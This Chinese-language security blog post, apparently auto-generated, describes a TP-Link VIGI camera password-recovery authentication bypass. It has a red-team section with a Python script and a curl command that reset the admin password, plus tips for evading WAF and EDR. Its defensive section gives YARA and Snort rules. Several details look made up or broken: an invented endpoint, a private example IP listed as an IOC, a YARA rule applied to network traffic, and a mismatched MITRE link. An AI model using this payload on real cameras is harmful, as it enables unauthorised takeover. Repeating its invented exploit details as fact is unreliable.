---
layout: post
title:  "TP-Link修補可完全控制VIGI攝影機的漏洞"
date:   2026-01-20 06:27:45 +0000
categories: [security]
severity: high
---

# 🔥 解析 TP-Link VIGI 攝影機密碼復原功能的驗證繞過漏洞
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS 4.0 8.7 分)
> * **受駭指標**: 繞過身分驗證控制，取得管理員控制權
> * **關鍵技術**: 身分驗證繞過、密碼復原功能、網路攝影機安全

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 漏洞源於 VIGI 攝影機本地 Web 介面的密碼復原功能中，沒有正確實現驗證機制，允許攻擊者在 LAN 上變更用戶端狀態，不經驗證即可重設管理員密碼。
* **攻擊流程圖解**: 
    1. 攻擊者發送請求到 VIGI 攝影機的 Web 介面，嘗試重設管理員密碼。
    2. 由於缺乏適當的驗證，攝影機允許攻擊者變更用戶端狀態。
    3. 攻擊者利用這個漏洞重設管理員密碼，取得管理員控制權。
* **受影響元件**: VIGI 及 VIGI InSight 等 30 餘種機種。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要在 LAN 上，具有網路攝影機的 IP 地址和相關的網路存取權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義攝影機的 IP 地址和密碼復原功能的 URL
    camera_ip = "192.168.1.100"
    password_recovery_url = f"http://{camera_ip}/password_recovery"
    
    # 建構 Payload
    payload = {
        "new_password": "new_password",
        "confirm_password": "new_password"
    }
    
    # 發送請求
    response = requests.post(password_recovery_url, data=payload)
    
    # 檢查是否成功
    if response.status_code == 200:
        print("密碼重設成功")
    else:
        print("密碼重設失敗")
    
    ```
    *範例指令*: 使用 `curl` 命令發送請求：

```

bash
curl -X POST -d "new_password=new_password&confirm_password=new_password" http://192.168.1.100/password_recovery

```
* **繞過技術**: 如果攝影機後面的網路環境有 WAF 或 EDR，攻擊者可能需要使用繞過技術，例如使用代理伺服器或修改請求的 User-Agent。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| IP | 192.168.1.100 |
| URL | http://192.168.1.100/password_recovery |
| File Path | /password_recovery |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule VIGI_Password_Recovery {
        meta:
            description = "VIGI 攝影機密碼復原功能的驗證繞過漏洞"
            author = "Your Name"
        strings:
            $url = "/password_recovery"
        condition:
            $url
    }
    
    ```
    或者是使用 Snort/Suricata Signature：

```

snort
alert tcp any any -> 192.168.1.100 80 (msg:"VIGI 攝影機密碼復原功能的驗證繞過漏洞"; content:"/password_recovery"; sid:1000001;)

```
* **緩解措施**: 除了更新修補之外，還可以修改攝影機的網路設定，限制存取攝影機的 IP 地址和密碼復原功能的 URL。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **身份驗證 (Authentication)**: 身份驗證是指驗證使用者的身份，確保只有授權的使用者可以存取系統或資源。
* **密碼復原 (Password Recovery)**: 密碼復原是指當使用者忘記密碼時，提供一個機制讓使用者可以重設密碼。
* **網路攝影機 (Network Camera)**: 網路攝影機是一種可以通過網路傳輸視頻和音頻的攝影機。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.ithome.com.tw/news/173476)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1110/)


